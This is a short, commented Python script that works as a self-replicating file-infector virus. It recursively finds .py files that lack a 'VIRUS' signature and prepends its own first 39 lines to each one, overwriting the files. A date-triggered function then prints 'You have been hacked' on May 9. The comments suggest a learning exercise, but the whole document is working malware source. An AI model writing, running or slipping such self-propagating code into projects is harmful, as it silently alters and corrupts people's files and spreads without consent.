#!/usr/bin/python3
import os
import datetime


# This line defines the variable
SIGNATURE = "VIRUS"
# This fuction has a recursive named locate and path is the argument. This will search for the 'signature' string
# ...if not located,it will add file path to the 'fiels_targeted.
def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
# This line starts a for loop that iterates over each item in the filelist    
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
# The fname[-3:] slices the last three characters of the fname string.
# ...Also if the condition is true, the code sets the infected variable to False, indicating that the file is not infected.       
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
# Thie will read then extraact the first 39 lines into the 'virusstring' variable.
        if 0 <= i < 39:
            virusstring += line
# This close the file object            
    virus.close
# This is a For loop that will opens each targeted file, reads its content, closes it, and then reopen it in write mode. 
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
# function is called after infecting the targeted files. It will print the message indicating a successful hack.
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()